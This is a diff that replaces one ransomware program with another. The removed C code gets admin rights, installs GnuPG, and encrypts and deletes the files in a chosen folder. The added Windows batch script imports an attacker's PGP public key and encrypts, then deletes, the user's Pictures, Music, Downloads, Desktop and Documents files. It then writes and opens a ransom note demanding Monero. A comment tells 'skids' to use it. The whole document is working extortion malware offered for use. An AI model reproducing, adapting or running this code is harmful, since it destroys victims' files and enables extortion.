@@ -1,74 +1,83 @@
-#include <windows.h>
-#include <stdio.h>
-#include <shellapi.h>
-#include <stdlib.h>
+@echo off
 
-// Function to check if the current process has admin rights
-BOOL IsRunningAsAdmin() {
-    BOOL isAdmin = FALSE;
-    PSID adminGroup = NULL;
 
-    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
-    if (AllocateAndInitializeSid(
-            &ntAuthority, 2,
-            SECURITY_BUILTIN_DOMAIN_RID,
-            DOMAIN_ALIAS_RID_ADMINS,
-            0, 0, 0, 0, 0, 0,
-            &adminGroup)) {
-        CheckTokenMembership(NULL, adminGroup, &isAdmin);
-        FreeSid(adminGroup);
-    }
-    return isAdmin;
-}
+winget --version >nul 2>&1
+if %errorlevel%==0 (
+    echo Winget is installed
+) else (
+    echo Winget is NOT installed, please install it.
+    pause
+    exit
+)
 
-// Function to restart the program with admin rights
-void RelaunchAsAdmin() {
-    char exePath[MAX_PATH];
-    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
-        printf("Error getting executable path.\n");
-        return;
-    }
 
-    SHELLEXECUTEINFOA sei = { sizeof(sei) };
-    sei.lpVerb = "runas"; // Request elevation
-    sei.lpFile = exePath;
-    sei.hwnd = NULL;
-    sei.nShow = SW_NORMAL;
 
-    if (!ShellExecuteExA(&sei)) {
-        DWORD err = GetLastError();
-        if (err == ERROR_CANCELLED) {
-            printf("User refused to grant admin rights.\n");
-        } else {
-            printf("Failed to restart as admin. Error: %lu\n", err);
-        }
-    }
-}
+winget install GnuPG.Gpg4win
+echo.
+echo Checking installation...
+gpg --version
+ 
+powershell -Command "$k=@'
+-----BEGIN PGP PUBLIC KEY BLOCK-----
 
-int main() {
-    if (IsRunningAsAdmin()) {
-        printf("Running with administrator privileges.\n");
-        // Place your admin-required code here
-    } else {
-        printf("Not running as administrator.\n");
-        printf("Admin rights are needed, do you want to run in admin and let this app run properly,or dont run in it ");
-        char choice;
-        if (scanf(" %c", &choice) == 1 && (choice == 'y' || choice == 'Y')) {
-            RelaunchAsAdmin();
-            printf("We are about to install the encryption app OpenSSL to encrypt your database, hold on tight!! ");
-            system("winget install GnuPG.GnuPG -e --silent");
-            printf("Installed!! ");
-            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\"");
-            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\"");
-            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\"");
-            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\""); 
-            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\"");
-            printf("insert message to user")                                                                                                                                                                                     // making this ransomware was a pain, so use it for a good reason skids. 
-        } else {
-            printf("Shutting down this app....\n");
-            return 0;
+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
++94G4hGr2nHaH4RuPpAN4Tuy
+=RsBc                                                                              
 
-        }
-    }
-    return 0;
-}
+-----END PGP PUBLIC KEY BLOCK-----
+'@; $k | gpg --import"
+gpg --encrypt --recipient "kaklaik@proton.me" --delete --trust-model always "%USERPROFILE%\Pictures\*"
+gpg --encrypt --recipient "kaklaik@proton.me" --delete --trust-model always "%USERPROFILE%\Music\*"
+gpg --encrypt --recipient "kaklaik@proton.me" --delete --trust-model always "%USERPROFILE%\Downloads\*"
+gpg --encrypt --recipient "kaklaik@proton.me" --delete --trust-model always "%USERPROFILE%\Desktop\*"
+gpg --encrypt --recipient "kaklaik@proton.me" --delete --trust-model always "%USERPROFILE%\Documents\*"
+echo Q: why am I in notepad? A: just read it.. Q: Did anything happen to my computer? A: Yes all the files in, pictures, music, downloads, desktop, and documents have been encrypted, and only I can unencrypt them. Q: can you please unencrypt them for me A: yes, but, first you will need to send 100 dollars worth of the cryptocurrency monero to XXXXXXXXXXXXXXXXXXXXXXXXXX Q: how will you unencrypt it after my payment? A: I will send you a special executable that can decrypt it. Q: what happens if I dont pay? A: you have lots of time to pay, you have a week! Yes, the full seven days! But if you dont pay in a week, your files will stay encrypted, in some insanely hard way which I dont believe exists, you can SOMEHOW unencrypt your files, but dont get too excited, I will say this, with no offense, that you are probably bad at tech, so you will not be able to do it yourself! > note.txt
+
+start notepad note.txt
